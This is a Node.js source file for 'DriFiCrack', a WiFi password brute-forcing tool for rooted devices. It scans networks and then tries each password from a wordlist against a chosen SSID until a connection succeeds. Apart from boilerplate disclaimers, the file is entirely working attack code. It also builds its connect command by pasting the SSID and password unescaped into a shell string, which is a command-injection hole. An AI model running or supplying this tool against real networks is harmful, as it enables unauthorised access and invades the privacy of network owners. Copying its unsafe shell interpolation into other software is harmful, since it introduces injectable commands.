/*
 * DriFiCrack - WiFi Password Cracking Tool
 * Copyright (c) 2025 ZeltNamizake
 *
 * Licensed under the MIT License.
 * You may obtain a copy of the License at:
 * https://opensource.org/licenses/MIT
 *
 * This tool is for educational purposes only.
 * Unauthorized use may violate local laws.
 * Use responsibly.
 */

const { exec } = require("child_process");
const fs = require("fs");

//Colors for terminal output
const G = `\x1b[32m`;
const C = `\x1b[36m`;
const R = `\x1b[31m`;
const Y = `\x1b[33m`;
const B = `\x1b[30m`;
const M = `\x1b[35m`;
const d = `\x1b[0m`;
const bl = `\x1b[1m`;
const u = `\x1b[2m`;

//Command-line arguments
const argv2 = process.argv[2];
const argv3 = process.argv[3];
const argv4 = process.argv[4];

// Delay function to pause between operations
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

// Check if the user has root privileges
function checkUserRoot() {
    return new Promise((resolve, reject) => {
        exec("whoami", (err, stdout) => {
            if (err) {
                reject(err);
            } else if (stdout.startsWith("root")) {
                resolve(true);
            } else {
                resolve(false);
            }
        });
    });
}

// Scan for WiFi networks using cmd wifi
async function scanWifi() {
    return new Promise((resolve, reject) => {
        exec(
            "cmd wifi start-scan && cmd wifi list-scan-results",
            (err, stdout, stderr) => {
                if (err) {
                    reject(err);
                } else if (stderr) {
                    reject(stderr);
                } else {
                    resolve(stdout);
                }
            }
        );
    });
}

// Parse the WiFi scan result to structured data
function parseWifiScanResult(scanResult) {
    const lines = scanResult.split("\n").filter(line => line.trim() !== "");
    const result = lines
        .slice(1)
        .map(line => {
            const match = line
                .trim()
                .match(
                    /^(\S+)\s+(\d+)\s+(-?\d+)\s+([\d,]+)\s+(.*)\s+\[(.*)\]$/
                );

            if (match) {
                const [_, bssid, frequency, rssi, age, ssid, flags] = match;

                return {
                    BSSID: bssid,
                    Frequency: frequency,
                    RSSI: rssi,
                    Age: age,
                    SSID: ssid.trim(),
                    Flags: flags.trim(),
                    formattedOutput: `
BSSID: ${bl}${bssid}${d}
SSID: ${bl}${ssid}${d}
Frequency: ${bl}${frequency} MHz${d}
RSSI: ${bl}${rssi} dBm${d}
Age: ${bl}${age} sec${d}
Flags: [${bl}${flags.trim()}${d}]
                `
                };
            }
            return null;
        })
        .filter(Boolean);

    return result;
}

// Check if WiFi is connected with the given password
function checkConnected(pass) {
    return new Promise((resolve, reject) => {
        exec("cmd wifi status", (err, stdout) => {
            if (err) {
                reject(err);
            } else if (stdout.includes("Wifi is not connected")) {
                console.log(`[${R}${bl}FAIL${d}] ${bl}Invalid password!${d}`);
                resolve(false);
            } else if (stdout.includes("WifiInfo:")) {
                console.log(
                    `[${G}${bl}SUCCESS${d}] ${bl}Password is valid:${d} ${bl}${G}${pass}${d}`
                );
                resolve(true);
            }
        });
    });
}

function checkWifi() {
    return new Promise((resolve, reject) => {
        exec("cmd wifi status", (err, stdout) => {
            if (err) {
                reject(err);
            } else if (stdout.includes("enabled")) {
                resolve(true);
            } else if (stdout.includes("disabled")) {
                resolve(false);
            }
        });
    });
}

// Connect to a specific WiFi network using a password
function connectWIFI(ssid, type, password) {
    return new Promise((resolve, reject) => {
        exec(
            `cmd wifi connect-network "${ssid}" ${type} "${password}"`,
            (err, stdout) => {
                if (err) reject(err);
                resolve(stdout);
            }
        );
    });
}

// Try cracking the WiFi password from a list
async function crackPassword(ssid, type, passwordList) {
    const passwords = fs
        .readFileSync(passwordList, "utf8")
        .split("\n")
        .filter(Boolean);
    console.log(`Starting DriFiCrack to crack passwords with brute force....`);

    for (const pass of passwords) {
        const pw = pass.trim();
        try {
            console.log(
                `\n[${G}${bl}INFO${d}] Trying password: ${bl}${Y}${pw}${d}`
            );
            await connectWIFI(ssid, type, pw);
            await delay(5000);
            const connected = await checkConnected(pw);
            if (!connected) {
                console.log(
                    `[${Y}${bl}STATUS${d}] Not connected to ${bl}${ssid}${d}`
                );
            } else {
                console.log(
                    `[${Y}${bl}STATUS${d}] Connected to ${bl}${ssid}${d}`
                );
                break;
            }
        } catch (err) {
            console.log(
                `[${R}${bl}ERROR${d}] ${bl}Failed to try password ${pw}: ${R}${err.message}${d}`
            );
        }
        await delay(5000);
    }
    console.log(`\nDriFiCrack finished brute-forcing passwords.`);
}

// Start the DriFiCrack process based on user input
async function startDriFiCrack() {
    const checkRoot = await checkUserRoot();
    if (checkRoot) {
        const information = `${bl}${R}
            %-.                                   .++
            %@#-                                 -+@+
            #@@@-.                              +@@@+
            +@@@@*-       .-=========-.       =+@@@@+
            .@@@@@%=. .=++*@@@@@@@@@@%*++=   +@@@@@@+
             @@@@@@@*+*@@@@@@*======+#@@@@*++@@@@@@@+
             @@@@@@@@@@@%=---.       :---#@@@@@@@@@@+
             @@@@@@@@@+-:                .:-@@@@@@@@+
             *@@@@@%-:.                     ::@@@@@@+
             .@@@@=.                          .-@@@@+
             %@@%.         .*%@@@@@@%=          :*@@+
            %@@:        =%@@@@@@@@@@@@@@%.        =@*.
           #@@        +@@@@=           +@@@:       =@=
          #@@.      =@@@=                 #@@.      =@=
         +@%.     :#@%=                     %%*.     =@-
        .#%.     -@@+            .           .#%.     ++.
        +%:     -@%=        :--==+----.        #%:     *-
       :+:     .@*:      .-=#***+==+**+-:      .##.    -+.
       ==      *+.      :+*+-         :++=      .*=     =.
       ::     -#       :#*.             :=+      .+:     .
      ..      %:      :+=.                -+      :-     =
      ..      -      :=:                   -=      .     .
             -       :-                     :      ..
             .       .         ####=
                              %@@@@@+
                             %@@@@@@@=
                             @@@@@@@@+
                            =@@@@@@@@*.
                             @@@@@@@@*.
                             @@@@@@@@+
                             *@@@@@@%-
                              *#@@@#=
                                **=${d}
                                
${bl}DriFiCrack 1.0.0 ( https://github.com/ZeltNamizake/DriFiCrack )${d}
Disclaimer:${u} DriFiCrack should only be used for legitimate purposes and only on WiFi
networks that you have permission to access. Using this tool to try to hack a WiFi
network without permission is illegal and violates other people's privacy.${d}

Usage: node drificrack [Commands]

COMMANDS:
   -h: Print help and information
   -bF <SSID> wpa2|wpa3: Start cracking password with brute force
   -sN: Scan network and print scan results
   
EXAMPLES:
   node drificrack -sN
   node drificrack -bF exampleSSID wpa2
   node drificrack -bF "example SSID" wpa3`;
        if (!argv2) {
            console.log(information);
        } else if (argv2.startsWith("-bF")) {
            const WifiON = await checkWifi();
            if (WifiON) {
                if (
                    (argv3 && argv4 === "wpa2") ||
                    (argv3 && argv4 === "wpa3")
                ) {
                    crackPassword(argv3, argv4, "./pass.txt");
                } else {
                    console.log(
                        "invalid command!\nTry 'node drificrack -h' for more information."
                    );
                }
            } else {
                console.log(
                    `[${R}${bl}ERROR${d}] ${bl}Wifi is disabled. Please try enabling it${d}`
                );
            }
        } else if (argv2.startsWith("-sN")) {
            const WifiON = await checkWifi();
            if (WifiON) {
                (async () => {
                    try {
                        const scanResult = await scanWifi();
                        const wifiNetworks = parseWifiScanResult(scanResult);
                        console.log(`DriFiCrack result scan:`);
                        wifiNetworks.forEach(network => {
                            console.log(network.formattedOutput);
                        });
                    } catch (error) {
                        console.error("Error:", error);
                    }
                })();
            } else {
                console.log(
                    `[${R}${bl}ERROR${d}] ${bl}Wifi is disabled. Please try enabling it${d}`
                );
            }
        } else if (argv2.startsWith("-h")) {
            console.log(information);
        } else {
            console.log(
                "invalid command!\nTry 'node drificrack -h' for more information."
            );
        }
    } else {
        console.log(`[${bl}${R}INFO${d}] DriFiCrack requires access root`);
    }
}

// Run the DriFiCrack tool
startDriFiCrack();
